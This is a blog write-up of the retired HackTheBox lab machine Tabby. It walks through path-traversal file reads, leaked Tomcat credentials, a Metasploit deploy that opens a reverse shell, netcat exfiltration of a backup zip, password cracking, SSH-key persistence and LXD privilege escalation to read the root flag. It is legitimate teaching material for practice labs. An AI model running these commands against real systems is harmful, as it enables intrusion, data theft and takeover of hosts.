<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Tabby | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/11/htb-tabby.html" title="Read more" class="entry-title-link">
                HTB: Tabby</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-11-10T20:55:00+01:00">10 Nov 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
          <a href="../../tag/tomcat.html" title="Read more with the label tomcat" class="meta-link">tomcat</a> 
          <a href="../../tag/zip.html" title="Read more with the label zip" class="meta-link">zip</a> 
          <a href="../../tag/lxd.html" title="Read more with the label lxd" class="meta-link">lxd</a> 
          <a href="../../tag/lxc.html" title="Read more with the label lxc" class="meta-link">lxc</a> 
          <a href="../../tag/lfi.html" title="Read more with the label LFI" class="meta-link">LFI</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.11/tabby_card.png" alt="Tabby Card" width="262"></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/259">Tabby</a> publish on June
20 2020 by <a href="https://www.hackthebox.com/home/users/profile/1190">egree55</a>.
This box is rated as an easy box. The user part implies a Local File Inclusion
(LFI) and the tomcat manager. The root part implies LXC/LXD (Linux kernel
containment).</p>


<h1 id="user-part">User part</h1>
<h2 id="recon">Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. As often with Windows Boxes, a lot of
port are open. A few interesting services are up:</p>
<ul>
<li>SSH on port 22</li>
<li>a Web service on port 80</li>
<li>a Web service (Tomcat) on port 8080</li>
</ul>
<p>Here is the full nmap scan:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sun Jun 21 09:30:32 2020 as: nmap -p- -sSV -oN nmap 10.10.10.194</span>
<span class="code-line">Nmap scan report for 10.10.10.194</span>
<span class="code-line">Host is up (0.080s latency).</span>
<span class="code-line">Not shown: 65532 closed ports</span>
<span class="code-line">PORT     STATE SERVICE VERSION</span>
<span class="code-line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
<span class="code-line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
<span class="code-line">8080/tcp open  http    Apache Tomcat</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></code></pre></div>

<h2 id="web">Web</h2>
<p>On port 8080 we have access to the tomcat administration component but we need
some credentials to access them.</p>
<p>The main website is about hosting services but we quickly notice that the page
<code>news.php</code> has a <code>file</code> parameter.</p>
<p>We manipulate the file and changing it to <code>../../../../../../../../etc/passwd</code>
allows us to access the content of the file. We have a LFI and we want to use it
in order to access the tomcat users' file.</p>
<p>We try the location mentioned on the page but the file is not accessible. We
need more information.</p>
<p>We know that the server is an Ubuntu (look at the banner in the <code>nmap</code> scan).</p>
<p>We look at the files from the <code>tomcat9-admin</code> package on the
<a href="https://packages.ubuntu.com/focal/all/tomcat9-admin/filelist">packages.ubuntu.com website</a></p>
<p>Therefore we get the <code>manager.xml</code> file but there is nothing interesting:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /news.php?file=../../../../../../../etc/tomcat9/Catalina/localhost/manager.xml HTTP/1.1</span>
<span class="code-line">Host: megahosting.htb</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Content-Length: 2</span>
<span class="code-line"></span>
<span class="code-line">SNIP</span>
<span class="code-line">&lt;Context path=&quot;/manager&quot;</span>
<span class="code-line">  docBase=&quot;/usr/share/tomcat9-admin/manager&quot;</span>
<span class="code-line">  antiResourceLocking=&quot;false&quot; privileged=&quot;true&quot; /&gt;</span>
<span class="code-line"></code></pre></div>

<p>We look at the files from the <code>tomcat9</code> package still on the
<a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">packages.ubuntu.com website</a>.</p>
<p>This time we will try to get the <code>tomcat-users.xml</code> file. This give an user and
its password. We also notice that its permissions are for the <code>admin-gui</code> and
<code>manager-scrit</code> NOT the classic <code>manager-gui</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /news.php?file=../../../../../../..//usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1</span>
<span class="code-line">Host: megahosting.htb</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Content-Length: 2</span>
<span class="code-line"></span>
<span class="code-line">SNIP</span>
<span class="code-line">  &lt;role rolename=&quot;admin-gui&quot;/&gt;</span>
<span class="code-line">  &lt;role rolename=&quot;manager-script&quot;/&gt;</span>
<span class="code-line">  &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;</span>
<span class="code-line">&lt;/tomcat-users&gt;</span>
<span class="code-line"></code></pre></div>

<p>As we are lazy, we fire up <code>metasploit</code>, load the <code>tomcat_mgr_deploy</code> module and
set the different option. As we have the permission for <code>manager-script</code> we just
need to specify that our <code>PATH</code> is <code>/manager/text</code> instead of <code>manager</code>. We also
need to set the target to <code>Java Universal</code> and the payload to
<code>java/shell_reverse_tcp</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; show options</span>
<span class="code-line"></span>
<span class="code-line">Module options (exploit/multi/http/tomcat_mgr_deploy):</span>
<span class="code-line"></span>
<span class="code-line">  Name          Current Setting     Required  Description</span>
<span class="code-line">  ----          ---------------     --------  -----------</span>
<span class="code-line">  HttpPassword  $3cureP4s5w0rd123!  no        The password for the specified username</span>
<span class="code-line">  HttpUsername  tomcat              no        The username to authenticate as</span>
<span class="code-line">  PATH          /manager/text       yes       The URI path of the manager app (/deploy and /undeploy will be used)</span>
<span class="code-line">  Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="code-line">  RHOSTS        10.10.10.194        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<span class="code-line">  RPORT         8080                yes       The target port (TCP)</span>
<span class="code-line">  SSL           false               no        Negotiate SSL/TLS for outgoing connections</span>
<span class="code-line">  VHOST         megahosting.htb     no        HTTP server virtual host</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Payload options (java/shell_reverse_tcp):</span>
<span class="code-line"></span>
<span class="code-line">  Name   Current Setting  Required  Description</span>
<span class="code-line">  ----   ---------------  --------  -----------</span>
<span class="code-line">  LHOST  10.10.14.113     yes       The listen address (an interface may be specified)</span>
<span class="code-line">  LPORT  4444             yes       The listen port</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Exploit target:</span>
<span class="code-line"></span>
<span class="code-line">  Id  Name</span>
<span class="code-line">  --  ----</span>
<span class="code-line">  1   Java Universal</span>
<span class="code-line"></code></pre></div>

<p>Then we can run the exploit and get a simple shell on the box as the
<code>tomcat</code>user.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; run</span>
<span class="code-line"></span>
<span class="code-line">[*] Started reverse TCP handler on 10.10.14.113:4444</span>
<span class="code-line">[*] Using manually select target &quot;Java Universal&quot;</span>
<span class="code-line">[*] Uploading 13418 bytes as KFEu1gbH8s1QeOlaSH3qHMNO1H4.war ...</span>
<span class="code-line">[*] Executing /KFEu1gbH8s1QeOlaSH3qHMNO1H4/u2A5WGIIbSw.jsp...</span>
<span class="code-line">[*] Undeploying KFEu1gbH8s1QeOlaSH3qHMNO1H4 ...</span>
<span class="code-line">[*] Command shell session 3 opened (10.10.14.113:4444 -&gt; 10.10.10.194:55206) at 2020-06-21 12:36:01 -0400</span>
<span class="code-line"></span>
<span class="code-line">id</span>
<span class="code-line">uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</span>
<span class="code-line"></code></pre></div>

<p>We know from the statement on the main website (port 80) that there was a
breach. Therefore we got the main website's directory in <code>/var/www/html</code>. We
found a zip archive in the <code>files</code> directory. We transfer it to our kali box
using netcat (we run <code>nc -l -p 1234 &gt; 16162020_backup.zip</code> on our kali box).</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cd /var/www/html</span>
<span class="code-line">ls</span>
<span class="code-line">assets</span>
<span class="code-line">favicon.ico</span>
<span class="code-line">files</span>
<span class="code-line">index.php</span>
<span class="code-line">logo.png</span>
<span class="code-line">news.php</span>
<span class="code-line">Readme.txt</span>
<span class="code-line">ls files</span>
<span class="code-line">16162020_backup.zip</span>
<span class="code-line">archive</span>
<span class="code-line">revoked_certs</span>
<span class="code-line">statement</span>
<span class="code-line">nc -w 3 10.10.14.177 1234 &lt;files/16162020_backup.zip</span>
<span class="code-line">id</span>
<span class="code-line">uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</span>
<span class="code-line"></code></pre></div>

<p>We use <code>zip2john</code> to get a proper hash to crack and run <code>john</code> with the
<code>rockyou</code> dictionary and a few rules. We quickly get the <code>admin@it</code> password
and are able to extract the archive content.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ zip2john 16162020_backup.zip &gt; hash</span>
<span class="code-line">16162020_backup.zip/var/www/html/assets/ is not encrypted!</span>
<span class="code-line">ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type</span>
<span class="code-line">ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2</span>
<span class="code-line">ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type</span>
<span class="code-line">ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6</span>
<span class="code-line">ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F</span>
<span class="code-line">ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E</span>
<span class="code-line">ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3</span>
<span class="code-line">NOTE: It is assumed that all files in each archive have the same password.</span>
<span class="code-line">If that is not the case, the hash may be uncrackable. To avoid this, use</span>
<span class="code-line">option -o to pick a file at a time.</span>
<span class="code-line"></span>
<span class="code-line">$ john hash -w=~/tools/password_lists/rockyou.txt --rules</span>
<span class="code-line">Using default input encoding: UTF-8</span>
<span class="code-line">Loaded 1 password hash (PKZIP [32/64])</span>
<span class="code-line">Will run 8 OpenMP threads</span>
<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="code-line">admin@it         (16162020_backup.zip)</span>
<span class="code-line">1g 0:00:00:01 DONE (2020-06-21 14:11) 0.6289g/s 6522Kp/s 6522Kc/s 6522KC/s adnbrie..adambossmaster</span>
<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
<span class="code-line">Session completed</span>
<span class="code-line"></code></pre></div>

<p>As the content of the zip file is useless we "quickly" think about password
reuse. In order to use <code>su</code> we need an better shell. As <code>python</code> is not
installed on the box we just use <code>perl</code>. Once we have a use shell we got to the
home directory and grab the user's flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<span class="code-line">/bin/sh: 2: python: not found</span>
<span class="code-line">perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</span>
<span class="code-line">su ash</span>
<span class="code-line">Password: admin@it</span>
<span class="code-line">id</span>
<span class="code-line">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span>
<span class="code-line">cd</span>
<span class="code-line">649a18cc3a17b4de465381ff93c3fc65</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<p>Now that we have a shell as <code>ash</code> we can just create a <code>.ssh</code> directory and put
our SSH public key in the <code>.ssh/authorized_keys</code> file.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>cd</span>
<span class="code-line">ls .ssh/</span>
<span class="code-line">ls: cannot access &#39;.ssh/&#39;: No such file or directory</span>
<span class="code-line">mkdir .ssh/</span>
<span class="code-line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCwES5PQLnAtM0JMAE4oyfsjruyj2bxjqZM55N5iMOGzqWt67KzQdbZYzRK5bvauo8xXtKEzzdvLNPHq0cS7v3vTiEIU3EcJGU1jjDN7tiUpUhc+KvVE0gR5JcScwGy8HSYI/PvbHiMSSH7e25r76G5EUpkxwjs4u+Kul7/24oMSvwLlI5u7R9OPTuMplfeLppp/EbVtNa/bWjFZ3CFFWFVyux/1ig16VaQXZxXJSGmElrAVUnA3eQbZYhs3ApavTnVmejz39BgNAoW0cPcXxM8t4ovNLdLxGPF728eFqABnOB/DFHkvK6oD8pdRL6IQYa5kYWx445aHZattAPv5JpGi0+Kt+kC1ZJPwn0trw2FceTOEcNhQlQ7jyAcWAUUCEMFIaJ6r85jHP0WWavCA39XwpicH/XymMBKppywqQ9+Z2GEY0MsnIvbYedkduXxCi6FrRvtWVNkI7GS52txVRvBy5U7LtwYs1DWH0tC+0C+/l+GbUTIw68Gw2msvu5HTHH+8KWxnBjwxqxySK7dXcrEJ+ZZO5HrJWJ2Gyds6CwSq9E8wo+ylkgR+4VvRq4Fc+QiQLp7WTeACo19LpC9n3z1LuQH9E0jSZGqNugO1PRzsN2HrD7VsOC0Go8+UoYGzVyrMnmR58xxDUGyXCxxss7bB6ZCB8bPGPDkQXDHpEhkeQ== kali@kali&#39; &gt; .ssh/authorized_keys</span>
<span class="code-line"></code></pre></div>

<p>We can now connect to the box using SSH.</p>
<p>When looking at our groups we saw that we are in the <code>lxd</code> group. This can lead
to a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#lxclxd">"quick" privilege escalation</a>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ash@tabby:~$ id</span>
<span class="code-line">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span>
<span class="code-line"></code></pre></div>

<p>On our kali box we clone and build the Alpine image then we copy it to the box.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder</span>
<span class="code-line">Cloning into &#39;lxd-alpine-builder&#39;...</span>
<span class="code-line">remote: Enumerating objects: 27, done.</span>
<span class="code-line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span>
<span class="code-line">Receiving objects: 100% (27/27), 16.00 KiB | 4.00 MiB/s, done.</span>
<span class="code-line">Resolving deltas: 100% (6/6), done.</span>
<span class="code-line">kali@kali:~$ cd lxd-alpine-builder/</span>
<span class="code-line">kali@kali:~/lxd-alpine-builder$ sudo ./build-alpine -a i686</span>
<span class="code-line">[sudo] password for kali:</span>
<span class="code-line">Determining the latest release... v3.12</span>
<span class="code-line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></span>
<span class="code-line">kali@kali:~/lxd-alpine-builder$ scp -r alpine-v3.12-i686-20200621_1247.tar.gz  ash@10.10.10.194:/tmp/.plop/</span>
<span class="code-line"></code></pre></div>

<p>We try to import the Alpine image but <code>LXD</code> is not initialize so we use <code>lxc
init</code> to initialize the environment with the default values.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ash@tabby:/tmp/.plop$ lxc image import ./alpine-v3.12-i686-20200621_1247.tar.gz --alias myimage</span>
<span class="code-line">If this is your first time running LXD on this machine, you should also run: lxd init</span>
<span class="code-line">To start your first instance, try: lxc launch ubuntu:18.04</span>
<span class="code-line"></span>
<span class="code-line">Image imported with fingerprint: c88a85d7bdacce8f8acc47713ad553e76b3fbb7d7027ba3cd5479e6085bba865</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true</span>
<span class="code-line">Creating mycontainer</span>
<span class="code-line">Error: No storage pool found. Please create a new storage pool</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true</span>
<span class="code-line">Creating mycontainer</span>
<span class="code-line">Error: No storage pool found. Please create a new storage pool</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxd init</span>
<span class="code-line">Would you like to use LXD clustering? (yes/no) [default=no]:</span>
<span class="code-line">Do you want to configure a new storage pool? (yes/no) [default=yes]:</span>
<span class="code-line">Name of the new storage pool [default=default]: ^[</span>
<span class="code-line">Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]:</span>
<span class="code-line">Create a new BTRFS pool? (yes/no) [default=yes]:</span>
<span class="code-line">Would you like to use an existing block device? (yes/no) [default=no]:</span>
<span class="code-line">Size in GB of the new loop device (1GB minimum) [default=15GB]:</span>
<span class="code-line">Would you like to connect to a MAAS server? (yes/no) [default=no]:</span>
<span class="code-line">Would you like to create a new local network bridge? (yes/no) [default=yes]:</span>
<span class="code-line">What should the new bridge be called? [default=lxdbr0]:</span>
<span class="code-line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span>
<span class="code-line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span>
<span class="code-line">Would you like LXD to be available over the network? (yes/no) [default=no]:</span>
<span class="code-line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes]</span>
<span class="code-line">Would you like a YAML &quot;lxd init&quot; preseed to be printed? (yes/no) [default=no]:</span>
<span class="code-line"></code></pre></div>

<p>Then we can initialize our container, mount the whole disk on the container
image and grab the root flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true</span>
<span class="code-line">Creating mycontainer</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</span>
<span class="code-line">Device mydevice added to mycontainer</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxc start mycontainer</span>
<span class="code-line">ash@tabby:/tmp/.plop$ lxc exec mycontainer /bin/sh</span>
<span class="code-line">~ # ls /mnt/root/</span>
<span class="code-line">bin/         cdrom/       etc/         lib/         lib64/       lost+found/  mnt/         proc/        run/         snap/        swap.img     tmp/         var/</span>
<span class="code-line">boot/        dev/         home/        lib32/       libx32/      media/       opt/         root/        sbin/        srv/         sys/         usr/</span>
<span class="code-line">~ # ls /mnt/root/root/</span>
<span class="code-line">root.txt  snap</span>
<span class="code-line">~ # cat /mnt/root/root/root.txt</span>
<span class="code-line">37cb707151d0433a17886caba89f81e1</span>
<span class="code-line"></code></pre></div>

<p>We don't have a root shell for that we will need to modify <code>/etc/shadow</code> in
order to modify the root password as we already did on the
<a href="/2020/10/htb-cache.html">cache box</a>.</p>
<h1 id="wrapping-up">Wrapping up</h1>
<p>This box was quit easy. The password reuse take me more time to realize as it
should have been. I recommend this box to beginners.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/11/htb-remote.html"> HTB: Remote </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/11/htb-buff.html"> HTB: Buff </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nosql.html">NoSQL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
